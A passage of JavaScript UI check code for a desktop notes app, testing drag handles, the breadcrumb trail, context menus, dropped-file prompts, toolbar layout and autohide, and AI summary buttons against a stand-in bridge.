          const z = app.getBoundingClientRect().width / app.offsetWidth || 1, hs = [];
          blkUnits(doc()).forEach((u, i) => { const b = blkRect(u); if (!b) return; const el = u.nodes.find(x => x.nodeType === 1);
            BLK.hover = null; clearTimeout(BLK.leave); BLK.leave = 0; blkPaint();   // QC 115: the last block's handle waits a moment (a grace); each unit starts clean
            el.dispatchEvent(new PointerEvent('pointermove', { clientX: b.left + 30, clientY: (b.top + b.bottom) / 2, bubbles: true })); const h = app.querySelector('.blk-layer [data-blk-handle]'), hr = h?.getBoundingClientRect();
            const ok = KIND[i] ? !!h && hr.right <= b.left + 1 && hr.right >= b.left - 12 * z && (u.kind === 'table' ? hr.bottom <= b.top + 1 && hr.bottom >= b.top - 8 * z : hr.top >= b.top - 1 && hr.top <= b.top + 12 * z) && !doc().contains(h) : !h;
            hs.push(`${KIND[i] || 'text'} ${h ? `${Math.round(b.left - hr.right)}px left` : 'none'}`); if (!ok) qb(KIND[i] ? `the ${KIND[i]} shows its handle at its left edge` : 'a plain paragraph shows no handle', `${scr}: ${hs[hs.length - 1]} (unit ${i}, hover ${BLK.hover?.i})`); });
          if (/blk-/.test(doc().innerHTML) || /blk-/.test(md())) qb('the handle is never part of the note', scr);
          Q.push(`handles ${hs.join(', ')}`);
          // a drag: the table's handle to the top gap; one Ctrl+Z step
          { const t = blkUnits(doc())[3], b = blkRect(t); t.nodes[0].dispatchEvent(new PointerEvent('pointermove', { clientX: b.left + 30, clientY: b.top + 10, bubbles: true }));
            const h = app.querySelector('.blk-layer [data-blk-handle]'), hr = h?.getBoundingClientRect(), top = blkRect(blkUnits(doc())[0]).top;
            if (!h) qb('dragging the table\'s handle to the top moves it there, with a drop line', `${scr}: no handle`); else {
            h.dispatchEvent(new PointerEvent('pointerdown', { clientX: hr.left + 5, clientY: hr.top + 5, button: 0, buttons: 1, bubbles: true, cancelable: true }));
            document.dispatchEvent(new PointerEvent('pointermove', { clientX: hr.left, clientY: top + 20, buttons: 1, bubbles: true })); document.dispatchEvent(new PointerEvent('pointermove', { clientX: hr.left, clientY: top - 6, buttons: 1, bubbles: true }));
            const line = !!app.querySelector('.blk-layer .blk-drop'); document.dispatchEvent(new PointerEvent('pointerup', { clientX: hr.left, clientY: top - 6, bubbles: true, cancelable: true }));
            const md1 = md(); Q.push(`drag: line ${line}, order ${order(md1).join('')}`);
            if (!line || order(md1).join('') !== '04123567') qb('dragging the table\'s handle to the top moves it there, with a drop line', `${scr}: line ${line}, order ${order(md1).join('')}`);
            edUndo(doc()); if (md() !== md0) qb('Ctrl+Z puts a dragged block back', order(md()).join('')); } }
          out.combos++;
        }
        Q.push(`shortcuts: ${KEYS.some(k => k.l.startsWith('Move an attachment') && keyText(k.k) === 'Alt+Shift+↑')}`);
        if (!KEYS.some(k => k.l.startsWith('Move an attachment'))) qb('Settings → Keyboard shortcuts lists Alt+Shift+↑ / ↓', '');
      } finally { BLK.pick = BLK.hover = BLK.drag = null; EDH.delete(n.id); set({ screen: '1920x1080', sample: 'typical', modal: null }); }   // the sample comes back as it was
      R.qc105 = Q.join(' · '); }

    // 27 · the trail never clips (the full sweep's "clipped trail" at 1366, a vault with many long steps): four steps with long
    //      names, in every sidebar/panel mix at 1366 and with the status bar's right side grown (the trail's column shrinks under it,
    //      as a download does): nothing in it is cut off; the steps that go are the oldest; the current place always shows, with
    //      its full name on hover
    { let noFrames = false; const keepTrail = S.trail, seen = [], LONG = 'A very long note title that goes on and on about the quarterly planning review';
      const clip = t => [t, ...t.querySelectorAll('*')].filter(el => { const cs = getComputedStyle(el); return el.clientWidth > 0 && el.scrollWidth > el.clientWidth + 1 && cs.overflowX === 'hidden' && cs.textOverflow !== 'ellipsis'; }).map(el => (el.className || el.tagName).toString().slice(0, 24));
      try {
        for (const [side, insp] of [[true, 'shown'], [true, 'hidden'], [false, 'shown'], [false, 'hidden']]) for (const extra of [0, 240, 480, 900]) {
          set({ screen: '1366x768', sample: 'typical', view: 'notes', modal: null, side, inspector: insp, zen: 'off' });
          note().title = `${LONG} 4`; S.trail = [0, 1, 2].map(i => ({ key: 'long' + i, kind: 'view', ref: 'tasks', label: `${LONG} ${i + 1}`, icon: 'file' })); renderAll();   // the open note is the 4th, where you are
          if (extra) { app.querySelector('.status-bar .status-right')?.insertAdjacentHTML('afterbegin', `<span class="chk-wide" style="display:inline-block;width:${extra}px"></span>`);   // the trail's own resize fits it
            // a ResizeObserver reports at a frame: a page with none (a hidden window or pane) never would, so it fits as the observer would
            const framed = await new Promise(r => { let ok = false; requestAnimationFrame(() => { ok = true; }); setTimeout(() => r(ok), 120); }); if (!framed) { trailFit(); noFrames = true; } }
          const t = app.querySelector('nav.trail'), steps = [...t.querySelectorAll(':scope > .trail-step')], shown = steps.map(s => getComputedStyle(s).display !== 'none'), cur = t.querySelector('.trail-pill[aria-current="true"]');
          const c = clip(t), suffix = shown.indexOf(true) < 0 || shown.slice(shown.indexOf(true)).every(Boolean), pill = cur && getComputedStyle(cur.closest('.trail-step')).display !== 'none' && cur.getBoundingClientRect().width > 20;
          seen.push(`${side ? 'side' : '-'}/${insp === 'shown' ? 'panel' : '-'}+${extra}: ${Math.round(t.clientWidth)}px ${shown.map(x => x ? 'o' : '·').join('')}${t.querySelector('.trail-label[data-fit-hide]') ? ' no label' : ''}${t.classList.contains('is-tight') ? ' tight' : ''}`);
          if (c.length) bad('the trail never clips', `${seen[seen.length - 1]}: ${c.join(', ')}`);
          if (!suffix) bad('the trail drops its oldest steps first', seen[seen.length - 1]);
          if (!pill || !cur.title.endsWith(`${LONG} 4`)) bad('the trail always shows where you are, its full name on hover', `${seen[seen.length - 1]}: "${cur?.title}"`);
          out.combos++;
        }
      } finally { S.trail = keepTrail; app.querySelectorAll('.chk-wide').forEach(x => x.remove()); set({ screen: '1920x1080', side: true, inspector: 'shown', modal: null }); }
      R.trailFit = seen.join(' · ') + (noFrames ? ' · no frames here (a hidden page): fitted directly, the resize path needs a shown window' : ' · fitted by its resize'); }

    // 8 · parity: no Windows right-click menu: a text box has Cut, Copy, Paste and Select all; elsewhere nothing; Shift + right-click is plain
    { set({ screen: '1920x1080', sample: 'typical', view: 'notes', modal: null }); const q = app.querySelector('.side-actions input, #file-search, input[type="search"]');
      const rc = (el, o = {}) => { const r = el.getBoundingClientRect(), ev = new MouseEvent('contextmenu', { clientX: r.left + 10, clientY: r.top + 5, button: 2, bubbles: true, cancelable: true, ...o }); el.dispatchEvent(ev); return ev; };
      const e1 = q && rc(q), m = app.querySelector('.par-fieldmenu'), labels = m ? [...m.querySelectorAll('.menu-item .truncate')].map(x => x.textContent).join(' ') : 'none';
      const e2 = rc(app.querySelector('.status-bar')), none = !app.querySelector('.par-fieldmenu, .menu--context');
      R.menu.fields = `search box: ${labels} · stopped ${e1?.defaultPrevented} · status bar: stopped ${e2.defaultPrevented}, no menu ${none} · djShifted ${djShifted({ shiftKey: true })}`;
      if (labels !== 'Cut Copy Paste Select all' || !e1?.defaultPrevented || !e2.defaultPrevented || !none || djShifted({ shiftKey: true })) bad('no Windows menu: a text box has its own, elsewhere nothing', R.menu.fields);
      S.ctx = { kind: 'word', word: 'outage', x: 200, y: 160, cx: 200, cy: 160, spell: { known: true, suggestions: [] } }; renderAll();
      const wm = app.querySelector('.menu--word'); if (!wm?.querySelector('[data-act="ctx-all"]') || /Windows/.test(wm.innerHTML)) bad('the note menu has Select all, and no Windows hint', wm?.textContent);
      S.ctx = null; renderAll(); out.combos++; }

    // 9 · parity: no "Attachments tab with no note open" setting, and no Attachments tab without a note
    { S.setSec = 'vault'; set({ screen: '1920x1080', modal: 'settings' }); const gone = !/Attachments tab with no note open/.test(app.querySelector('.settings-pane')?.textContent || '');
      const dq = [...app.querySelectorAll('[data-act="dq-mode"]')].map(b => b.textContent + (b.getAttribute('aria-pressed') === 'true' ? '*' : '')).join('/');
      S.modal = null; renderAll(); R.att = `setting gone ${gone} · tab with no note ${attTabShown(null)} · drop setting ${dq}`;
      if (!gone || attTabShown(null) || dq !== 'Choice rows*/A bar over the note') bad('the empty-tab setting is gone; "When you drop a file" is there', R.att); out.combos++; }

    // 10 · parity: dropped files asked one at a time ("1 of 3", Skip, Do the same for the other N), as rows or a bar
    { set({ screen: '1920x1080', sample: 'typical', view: 'notes', modal: null }); const n = note(), done = [], k0 = doOffice; R.drop = {};
      doOffice = async (files, how) => { done.push(files.map(f => f.name).join('+') + ':' + how); };   // eslint-disable-line no-global-assign
      try {
        for (const mode of ['rows', 'bar']) {
          DROPO.dialog = mode; done.length = 0; const mk = () => ['a.pdf', 'b.docx', 'c.pdf'].map(x => ({ name: x, kind: x.endsWith('pdf') ? 'pdf' : 'docx', size: 120000, path: 'C:/d/' + x })), files = mk();
          DROPO.ask = { files, noteId: n.id, at: 0 }; S.modal = 'do-ask'; renderAll(); const steps = [];
          const look = () => { const d = app.querySelector('.do-ask'); return `${d?.querySelector('.dq-count')?.textContent || '-'} ${d?.querySelector('.dq-file-name')?.textContent || '-'}${mode === 'rows' ? ' · ' + [...d.querySelectorAll('.dq-choice')].length + ' rows' : ' · bar ' + !!d?.matches('.dq-bar') + ' backdrop ' + !!app.querySelector('.modal-backdrop .do-ask')}`; };
          steps.push(look()); const click = sel => { app.querySelector(sel)?.click(); };
          click('[data-act="dq-pick"][data-v="convert"]'); click('[data-act="dq-add"]'); await wait(0); steps.push(look());
          click('[data-act="dq-skip"]'); await wait(0); steps.push(look());
          const last = !app.querySelector('[data-dq-same]'); click('[data-act="dq-add"]'); await wait(0);
          R.drop[mode] = `${steps.join(' → ')} · then ${done.join(', ')} · open ${S.modal === 'do-ask'}`;
          if (done.join(', ') !== 'a.pdf:convert, c.pdf:attach' || !/^1 of 3 a\.pdf/.test(steps[0]) || !/^2 of 3 b\.docx/.test(steps[1]) || !/^3 of 3 c\.pdf/.test(steps[2]) || !last || S.modal === 'do-ask'
            || (mode === 'rows' && !/3 rows/.test(steps[0])) || (mode === 'bar' && !/bar true backdrop false/.test(steps[0]))) bad(`dropped files asked one at a time (${mode})`, R.drop[mode]);
          // "Do the same for the other 2": the first answer goes for all three
          done.length = 0; DROPO.ask = { files: mk(), noteId: n.id, at: 0 }; S.modal = 'do-ask'; renderAll();
          if (mode === 'rows') { const cb = app.querySelector('[data-dq-same]'); cb.checked = true; cb.dispatchEvent(new Event('change', { bubbles: true })); } else DROPO.ask.q.same = true;
          click('[data-act="dq-add"]'); await wait(0); R.drop[mode + 'Same'] = done.join(', ');
          if (done.join(', ') !== 'a.pdf+b.docx+c.pdf:attach') bad(`"Do the same for the other N" (${mode})`, R.drop[mode + 'Same']);
          // no note open: Attach to this note can't be picked, and says why
          DROPO.ask = { files: mk().slice(0, 1), noteId: null, at: null }; S.modal = 'do-ask'; renderAll(); const off = app.querySelector('[data-act="dq-pick"][data-v="attach"]');
          if (off?.getAttribute('aria-disabled') !== 'true' || DROPO.ask.q.pick === 'attach') bad('with no note open, "Attach to this note" is off', mode);
          app.querySelector('[data-act="dq-x"]')?.click(); out.combos++; }
      } finally { doOffice = k0; DROPO.dialog = 'rows'; DROPO.ask = null; S.modal = null; renderAll(); }   // eslint-disable-line no-global-assign
    }

    // 11 · parity: the toolbar: Attach right after Image (into this note, no question); Position, Width, Autohide
    { R.tb = {}; const keepTb = { ...PAR.tb };
      set({ screen: '1920x1080', sample: 'typical', view: 'notes', modal: null, zen: 'off' }); const img = app.querySelector('.ed-toolbar [data-fmt="image"]');
      R.tb.attach = `after Image: ${img?.nextElementSibling?.dataset.fmt} · overflow order ${ED_OVERFLOW.indexOf('attach') === ED_OVERFLOW.indexOf('image') - 1}`;
      if (img?.nextElementSibling?.dataset.fmt !== 'attach' || ED_OVERFLOW.indexOf('attach') !== ED_OVERFLOW.indexOf('image') - 1) bad('Attach sits right after Image', R.tb.attach);
      { const k = { doAttach }, live0 = VAULT.live, got = []; window.pywebview = { api: new Proxy({}, { get: (_, nm) => typeof nm !== 'string' || nm === 'then' ? undefined : (...a) => Promise.resolve(nm === 'attach_pick' ? { status: 'success', path: 'C:/d/Quote.pdf' } : nm === 'get_settings' ? {} : { status: 'success' }) }) };
        VAULT.live = true; doAttach = async (files, noteId, at) => { got.push(`${files.map(f => f.name).join('+')} → ${noteId} @${at}`); };   // eslint-disable-line no-global-assign
        try { const doc = app.querySelector('.doc'); doc.focus(); const p = doc.querySelector('p'); if (p) { const r = document.createRange(); r.setStart(p.firstChild || p, 0); r.collapse(true); getSelection().removeAllRanges(); getSelection().addRange(r); }
          app.querySelector('.ed-toolbar [data-fmt="attach"]').click(); for (let i = 0; i < 5 && !got.length; i++) await wait(0); }
        finally { ({ doAttach } = k); VAULT.live = live0; }   // eslint-disable-line no-global-assign
        R.tb.attached = got.join(', ') || 'nothing'; if (got.length !== 1 || !got[0].startsWith(`Quote.pdf → ${note().id} @`) || S.modal) bad('Attach puts the picked file into this note, with no question', R.tb.attached); }
      const geo = () => { const tb = app.querySelector('.view-inner > .ed-toolbar'), d = app.querySelector('.doc'), v = app.querySelector('.view--note'), k = parZoom(), b = tb.getBoundingClientRect(), vb = v.getBoundingClientRect();
        return { w: Math.round(b.width / k), docW: Math.round(d.getBoundingClientRect().width / k), inView: b.left >= vb.left - 1 && b.right <= vb.left + v.clientWidth * k + 1, dir: getComputedStyle(tb).flexDirection, op: getComputedStyle(tb).opacity, left: Math.round((b.left - vb.left) / k), dl: Math.round((d.getBoundingClientRect().left - vb.left) / k) }; };
      for (const sc of ['1920x1080', '1366x768', 'portrait1080']) {
        const row = R.tb[sc] = {};
        for (const [pos, width] of [['top', 'fit'], ['top', 'full'], ['top', 'text'], ['left', 'fit'], ['right', 'fit']]) {
          Object.assign(PAR.tb, { pos, width, hide: 'off' }); parWidths(); set({ screen: sc, sample: 'typical', view: 'notes', modal: null }); const g = geo(); row[`${pos}/${width}`] = `${g.w}px (text ${g.docW}) ${g.dir} in view ${g.inView}`;
          if (!g.inView) bad('the toolbar stays inside the note area', `${sc} ${pos}/${width}: ${row[`${pos}/${width}`]}`);
          if (pos === 'top' && width === 'full' && !(g.w > g.docW)) bad('Full width is wider than the text column', `${sc}: ${row['top/full']}`);
          if (pos !== 'top' && (g.dir !== 'column' || g.w !== 44)) bad('Left / Right: a 44px column', `${sc} ${pos}: ${row[`${pos}/${width}`]}`);
          if (pos === 'left' && !(g.left < g.dl)) bad('Left: the column is left of the text', `${sc}: ${g.left} vs ${g.dl}`);
          if (pos === 'right' && !(g.left > g.dl)) bad('Right: the column is right of the text', `${sc}: ${g.left} vs ${g.dl}`);
          out.combos++; }
      }
      // R54 (QC 66): Fit the buttons, the default: as wide as its buttons (else the note area less 16px a side, the rest in ⋯),
      // centred on the text column, never wider than the note area; at 1366, 1920 and 2560 (the mockup: 738 / 1032 / 1032, 0 off centre)
      { SCREENS['2560x1305'] = [2560, 1305]; R.tb.fit = {};
        for (const sc of ['1366x768', '1920x1080', '2560x1305']) {
          Object.assign(PAR.tb, { pos: 'top', width: 'fit', hide: 'off' }); parWidths(); set({ screen: sc, sample: 'typical', view: 'notes', modal: null, side: true, inspector: 'shown', zen: 'off' });
          const tb = app.querySelector('.view-inner > .ed-toolbar'), vi = tb.parentElement, v = tb.closest('.view--note'), k = parZoom(), b = tb.getBoundingClientRect(), vb = v.getBoundingClientRect(), ib = vi.getBoundingClientRect();
          const w = b.width / k, room = v.clientWidth - 32, off = ((b.left + b.right) / 2 - (ib.left + ib.right) / 2) / k;
          const l = (b.left - vb.left) / k, r = (vb.left + v.clientWidth * k - b.right) / k, ovf = [...tb.querySelectorAll('.is-ovf')].length;
          tb.style.width = 'max-content'; tb.querySelectorAll('.is-ovf').forEach(x => x.classList.remove('is-ovf')); const natural = tb.getBoundingClientRect().width / k; parToolbar();
          R.tb.fit[sc] = `${Math.round(w)}px (buttons ${Math.round(natural)}, note area ${Math.round(room)} + 32) · ${off.toFixed(1)}px off the text's centre · ${Math.round(l)} / ${Math.round(r)} from the area's edges · ${ovf} in ⋯ · ${tb.dataset.fit}`;
          const want = Math.min(natural, room), edge = Math.min(l, r) < 16.5;
          if (Math.abs(w - want) > 1 || l < 15.5 || r < 15.5 || (Math.abs(off) > .5 && !edge) || (natural > room + 1) !== ovf > 0) bad('R54 Fit the buttons: as wide as its buttons, centred on the text, inside the note area', `${sc}: ${R.tb.fit[sc]}`);
          out.combos++; }
        delete SCREENS['2560x1305']; set({ screen: '1920x1080' }); }
      // QC 110 (feedback: "autohide the toolbar and bring it back when clicking or hovering over the top of a note"): Point at the top.
      //   Hidden, taking no room (the text moves up); not shown by pointing at the middle of the note; shown by pointing at or clicking
      //   the strip (the top; Left / Right: that side), and by Tab; held while a menu of it is open; gone 1 s after (60 ms here); a
      //   slim line marks the strip; showing it never moves the text
      { R.tb.point = {}; PAR.hideMs = 60; const tbEl = () => app.querySelector('.view-inner > .ed-toolbar'), op = () => getComputedStyle(tbEl()).opacity, on = () => document.body.dataset.tbshow === '1' && op() === '1';
        const firstY = () => app.querySelector('.doc')?.firstElementChild?.getBoundingClientRect().top ?? NaN, pe = (el, x, y, t = 'pointermove') => el.dispatchEvent(new PointerEvent(t, { clientX: x, clientY: y, bubbles: true, cancelable: true, button: 0 }));
        const quiet = () => { tbEl().style.transition = 'none'; };
        try {
          for (const pos of ['top', 'left', 'right']) {
            Object.assign(PAR.tb, { pos, width: 'fit', hide: 'off' }); parWidths(); set({ screen: '1920x1080', sample: 'typical', view: 'notes', modal: null, side: true, inspector: 'shown', zen: 'off' }); quiet(); const yOff = firstY();
            PAR.tb.hide = 'hover'; parWidths(); renderAll(); quiet(); document.activeElement?.blur?.(); parTbShow(false); PAR.tbOver = false;
            const v = app.querySelector('.view--note'), r = v.getBoundingClientRect(), z = parZoom(), doc = app.querySelector('.doc'), dr = doc.getBoundingClientRect(), f = [];
            const yHid = firstY(), hint = getComputedStyle(v, '::before'), hidden = op() === '0' && getComputedStyle(tbEl()).pointerEvents === 'none';
            if (!hidden) f.push(`shown at the start (${op()})`);
            if (pos === 'top' && !(yHid < yOff - 20)) f.push(`the text didn't move up into its room (${Math.round(yOff)} → ${Math.round(yHid)})`);
            if (hint.content === 'none' || hint.backgroundColor !== colorOf('--border')) f.push(`no hint line (${hint.content}, ${hint.backgroundColor})`);
            pe(doc, (dr.left + dr.right) / 2, (dr.top + dr.bottom) / 2); if (on()) f.push('pointing at the middle of the note shows it');
            const sx = pos === 'left' ? r.left + 10 * z : pos === 'right' ? r.left + v.clientWidth * z - 10 * z : (r.left + r.right) / 2, sy = pos === 'top' ? r.top + 10 * z : (r.top + r.bottom) / 2;
            pe(v, sx, sy); const shownHover = on(), yShown = firstY(), hintGone = getComputedStyle(v, '::before').content === 'none';
            if (!shownHover) f.push('pointing at the strip doesn’t show it'); if (Math.abs(yShown - yHid) > .5) f.push(`the text moved ${Math.round(yShown - yHid)}px when it showed`); if (!hintGone) f.push('the hint line stays while it’s shown');
            pe(doc, (dr.left + dr.right) / 2, (dr.top + dr.bottom) / 2); const stillThere = on(); await wait(150); const goneLater = !on();
            if (!stillThere || !goneLater) f.push(`after the pointer leaves: at once ${stillThere ? 'shown' : 'hidden'}, a moment later ${goneLater ? 'hidden' : 'shown'}`);
            pe(v, sx, sy, 'pointerdown'); const clickShow = on(); pe(doc, (dr.left + dr.right) / 2, (dr.top + dr.bottom) / 2);
            S.edMore = true; renderAll(); quiet(); await wait(150); const held = on(); S.edMore = false; renderAll(); quiet(); await wait(450); const releasedGone = !on();
            if (!clickShow) f.push('a click in the strip doesn’t show it'); if (!held || !releasedGone) f.push(`its ⋯ menu open: held ${held}, gone after it closed ${releasedGone} (focus ${document.activeElement?.tagName}.${document.activeElement?.className}, over ${PAR.tbOver}, hold ${parTbHold()}, timer ${!!PAR.tbT})`);
            tbEl().querySelector('button')?.focus(); const keyShow = on(); document.activeElement?.blur?.(); await wait(150); const keyGone = !on();
            if (!keyShow || !keyGone) f.push(`the keyboard: Tab in shows it ${keyShow}, gone after ${keyGone}`);
            R.tb.point[pos] = f.join('; ') || `hidden, the text up ${Math.round(yOff - yHid)}px · the strip shows it, the text stays · gone 60 ms after · click · menu hold · keyboard`;
            if (f.length) bad(`QC 110 Autohide, Point at the top (${pos})`, f.join('; '));
            out.combos++;
          }
        } finally { delete PAR.hideMs; parTbShow(false); Object.assign(PAR.tb, { pos: 'top', width: 'full', hide: 'off' }); parWidths(); set({ screen: '1920x1080', sample: 'typical', view: 'notes' }); } }
      app.querySelector('.view-inner > .ed-toolbar').style.transition = 'none';   // the end state, not the fade (a hidden pane throttles transitions)
      R.tb.hide = '';
      Object.assign(PAR.tb, { hide: 'caret' }); parWidths(); app.querySelector('.doc').focus(); R.tb.hide += ` · while typing, caret in: ${geo().op} (focus-within ${!!app.querySelector('.view-inner:focus-within')})`; if (geo().op !== '1') bad('Autohide while typing shows it with the caret in the note', R.tb.hide);
      Object.assign(PAR.tb, { hide: 'off' }); parWidths();
      S.setSec = 'editor'; set({ modal: 'settings' }); const rows = [...app.querySelectorAll('.par-tb-set .set-row')].map(r => r.querySelector('.set-label').textContent + ' ' + [...r.querySelectorAll('.seg-opt')].map(b => b.textContent + (b.getAttribute('aria-pressed') === 'true' ? '*' : '')).join('/'));
      R.tb.settings = rows.join(' | '); if (R.tb.settings !== 'Position Top*/Left/Right | Width Fit the buttons/Text column/Full width* | Autohide Off*/Point at the top/While typing') bad('Settings → Editor → Toolbar', R.tb.settings);
      PAR.saved = []; app.querySelector('[data-act="par-tb"][data-v="width:fit"]').click(); app.querySelector('[data-act="par-tb"][data-v="pos:right"]').click(); R.tb.saved = JSON.stringify(PAR.saved);   // R54: a picked width is kept (toolbar_width_picked)
      if (R.tb.saved !== '[{"toolbar_width":"fit","toolbar_width_picked":true},{"toolbar_position":"right"}]' || document.body.dataset.tbpos !== 'right') bad('the toolbar settings save and apply', R.tb.saved);
      S.modal = null; Object.assign(PAR.tb, keepTb); parWidths(); renderAll(); }
  } finally {
    window.pywebview = was; Object.assign(BD, keepBD); S.ctx = null; S.modal = null; S.dumpDraft = ''; LD.list = null; renderAll();
  }
}
/* ==== end Build M · round 6 ==== */
/* ==== Build N (mockups R43, R45, R46; Tidy up with AI, 2026-10-17): the two AI icons greyed with no AI and working with it;
   Summarise in its three places (popover, right sidebar, card) at two screens and four fonts; Insert at the top as a callout
   and Ctrl+Z; Cancel as a real stop (ai_job_cancel); Ask with its own model, its thread and its scope; Tidy up with AI from
   the right-click menu, its before/after, Replace and Ctrl+Z; Settings → AI models (three job rows, Where answers show).
   A stand-in bridge answers: the check never runs a model or writes config.json. Alone: ?check=1&only=buildn ==== */
async function checkBuildN() {
  const N = out.numbers.buildN = { off: {}, sum: {}, places: {}, ask: {}, tidy: {}, settings: {}, flows: {} }, bad = (k, v) => iss('Build N ' + k, v);
  // the cloud blocks need cloud_providers.json: in file mode without --allow-file-access-from-files it can't load, so they say so and skip (no throw)
  const cloudOk = async name => { try { await CLOUD.ready; } catch (e) { /* reported below */ } if (CLOUD.data) return true;
    bad('cloud checks skipped', `${name}: cloud_providers.json didn't load (in file mode, run Chrome with --allow-file-access-from-files)`); return false; };
  const tick = (n = 4) => new Promise(r => { let i = 0; const f = () => ++i >= n ? r() : setTimeout(f, 0); setTimeout(f, 0); });
  const until = async (f, n = 60) => { for (let i = 0; i < n && !f(); i++) await tick(3); return f(); };
  const withApi = async (fake, fn) => { const was = window.pywebview, calls = [];
    window.pywebview = { api: new Proxy({}, { get: (_, n) => typeof n !== 'string' || n === 'then' ? undefined : (...a) => { calls.push([n, a]); return Promise.resolve(fake[n] ? fake[n](...a) : { status: 'success' }); } }) };
    try { await fn(calls); } finally { window.pywebview = was; } return calls; };
  const inWin = (el, key, what) => { if (!el) { bad(what + ' missing', key); return; } const a = app.getBoundingClientRect(), b = el.getBoundingClientRect(); if (b.left < a.left - 1 || b.right > a.right + 1 || b.top < a.top - 1 || b.bottom > a.bottom + 1) bad(what + ' inside the window', `${key}: ${[b.left, b.top, b.right, b.bottom].map(Math.round)} in ${Math.round(a.width)}×${Math.round(a.height)}`); };
  const under = (el, btn, key, what) => { if (!el || !btn) return; const e = el.getBoundingClientRect(), b = btn.getBoundingClientRect(), gap = Math.round(e.top - b.bottom); if (gap < 4 || gap > 8) bad(what + ' 6px under its button', `${key}: ${gap}px`); };
  const keep = { st: AI.st, demo: AI.demo, place: AIN.place, mode: AIN.askMode, tidy: [AIN.tidyStrength, AIN.tidyRule] };
  const reset = () => { AIN.notes = {}; AIN.ask = {}; AIN.sum = { open: false, menu: null }; AIN.askUi = { open: false, menu: null }; AIN.tidy = null; AIN.place = 'popover'; AIN.askMode = 'general'; AIN.tidyStrength = 'standard'; AIN.tidyRule = '';
    Object.assign(AIC, { open: false, mode: 'dock', dockW: 400, rect: null, esc: 'stop', scope: 'note', chats: {}, drafts: {}, busy: null, menu: null, unread: false, caret: null,
      follow: 'note', hist: 'whole', histN: 6, newHow: 'fresh', aiOn: true, past: {}, viewing: null, toTop: false }); };
  const job = (result, state = 'done') => ({ ai_job: () => ({ status: 'success', state, result, message: '' }) });
  const SUM = '- The roadmap is due on **Friday**.\n- Maya owns the [[audit]].';
  set({ screen: '1920x1080', theme: 'obsidian', font: 'opendyslexic', sample: 'typical', view: 'notes', side: true, inspector: 'shown', widgets: 'none', zen: 'off', modal: null });
  reset();
  try {
    // 1 · No AI (nothing on this PC, Ollama and LM Studio off): both icons stay, greyed, with the reason on hover and focus; a click opens Settings → AI models
    { aiDemo('none'); AI.st.providers = {}; renderAll();
      const b = [...app.querySelectorAll('.ain-btn')], svgOp = b.map(x => getComputedStyle(x.querySelector('svg')).opacity);
      N.off = { icons: b.map(x => x.dataset.act).join(' '), disabled: b.map(x => x.getAttribute('aria-disabled')).join(' '), tip: b[0]?.dataset.tip, svg: svgOp.join(' '), before: b[1]?.nextElementSibling?.dataset.act || b[0]?.parentElement.nextElementSibling?.dataset.act };
      if (b.length !== 2 || N.off.disabled !== 'true true' || N.off.tip !== 'Enable AI to use this feature' || svgOp.some(o => +o > .4) || N.off.before !== 'menu') bad('greyed with no AI, before More', JSON.stringify(N.off));
      const rules = [...document.styleSheets].flatMap(sh => { try { return [...sh.cssRules]; } catch (e) { return []; } }).map(r => r.selectorText || '').join(' ');
      tipShow(b[0]); N.off.focusTip = !TIP.el.hidden && TIP.el.textContent === 'Enable AI to use this feature' && !!rules; tipHide();   // QC 70: the shared tooltip, on hover and on focus
      if (!N.off.focusTip) bad('the reason shows on hover and keyboard focus', 'no :hover / :focus-visible tooltip rule');
      b[0].click(); await tick(); N.off.click = `${S.modal}/${S.setSec}`; if (S.modal !== 'settings' || S.setSec !== 'ai') bad('a greyed icon opens Settings → AI models', N.off.click);
      set({ modal: null }); }
    aiDemo('ready'); AIN.place = 'popover'; renderAll();   // the place as it starts (config.json may say otherwise)
    const n = note(), id = rawId(n.id);
    // 2 · Summarise: at once, a working row with Cancel, the answer (Markdown, the reader's text size), Insert at the top, Ctrl+Z
    { let calls = await withApi({ ai_summary: () => ({ status: 'success', job: 'job-1' }), ...job(null, 'running') }, async (cl) => {
        app.querySelector('[data-act="ain-sum"]').click(); await until(() => app.querySelector('.ain-busy'));
        const pop = app.querySelector('[data-ain-pop="sum"]'); N.sum.busy = app.querySelector('.ain-busy')?.textContent.trim().replace(/\s+/g, ' ');
        inWin(pop, '1920 busy', 'summary popover'); under(pop, app.querySelector('[data-act="ain-sum"]'), '1920', 'summary popover');
        app.querySelector('[data-act="ain-sum-cancel"]').click(); await until(() => cl.some(x => x[0] === 'ai_job_cancel'), 20); });
      const cancel = calls.find(c => c[0] === 'ai_job_cancel');
      N.sum.cancel = `${calls.map(c => c[0]).filter((x, i, a) => a.indexOf(x) === i).join(', ')} · state ${ainNote(n.id).state}`;
      if (!cancel || cancel[1][0] !== 'job-1' || ainNote(n.id).state !== 'idle' || ainNote(n.id).answers.length) bad('Cancel stops the job (ai_job_cancel) and drops the answer', N.sum.cancel);
      const sent = calls.find(c => c[0] === 'ai_summary'); if (!sent || sent[1][0] !== id || typeof sent[1][1] !== 'string') bad('ai_summary gets the note and its text', JSON.stringify(sent?.[1]));
      calls = await withApi({ ai_summary: () => ({ status: 'success', job: 'job-2' }), ...job({ answer: SUM, by: 'Qwen3.5 4B' }) }, async () => {
        app.querySelector('[data-act="ain-sum-run"]').click(); await until(() => app.querySelector('.ain-answer')); });   // the panel's own button: Summarise this note
      const ans = app.querySelector('.ain-answer'), txt = ans?.querySelector('.ain-text'), cs = txt && getComputedStyle(txt), ds = getComputedStyle(app.querySelector('.doc'));
      N.sum.answer = `${ans?.querySelector('.ain-by-text')?.textContent.trim()} · ${txt?.querySelectorAll('li').length} points · link ${!!txt?.querySelector('.wikilink')} · ${cs?.fontSize}/${cs?.lineHeight} vs ${ds.fontSize}/${ds.lineHeight}`;
      if (!ans || txt.querySelectorAll('li').length !== 2 || !txt.querySelector('strong') || !txt.querySelector('.wikilink') || cs.fontSize !== ds.fontSize || cs.lineHeight !== ds.lineHeight) bad('the answer: Markdown in the note\'s text settings', N.sum.answer);
      const acts = [...(ans?.querySelectorAll('.ain-acts .btn') || [])].map(b => b.textContent.trim()); if (acts.join('|') !== 'Dismiss|Copy|Insert at the top') bad('the answer\'s buttons, the main one last', acts.join('|'));
      // Insert at the top: a callout, saved as > [!summary]; Ctrl+Z takes it out (one step). A plain note: the sample's typed
      // [[links]] become links when the editor is drawn again, which (rightly) starts its undo history again
      clearTimeout(n.saveT); n.docDirty = false; n.dirty = false; n.md = '# Plan\nThe roadmap is due on Friday.'; n.html = null; AIN.sum.open = true; renderAll();
      app.querySelector('[data-act="ain-insert"]')?.click(); await tick();
